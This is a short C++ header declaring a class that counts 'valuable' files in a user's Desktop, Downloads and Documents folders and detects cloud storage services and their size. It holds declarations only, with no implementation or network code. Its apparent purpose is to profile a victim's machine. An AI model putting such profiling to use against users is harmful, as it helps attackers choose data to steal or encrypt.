#pragma once

#include "includes.hpp"

class fs_utils
{
    public:
        struct DocumentsReport {
            int valuableDesktopCount = 0;
            int valuableDownloadsCount = 0;
            int valuableDocumentsCount = 0;
            int totalValuables = 0;

            std::vector<std::string> cloudStorageFound = {};
            std::string cloudStorageSize = "0 MB";
        };

        DocumentsReport generateDocumentsReport();

        std::string GetEnv(const char* varName);

    private:
        std::vector<std::string> enumerateFolder(REFKNOWNFOLDERID folderId);
        std::vector<std::string> filterFilesByType(const std::vector<std::string>& files, const std::vector<std::string>& extensions);

        void detectCloudStorage(DocumentsReport& report);
};
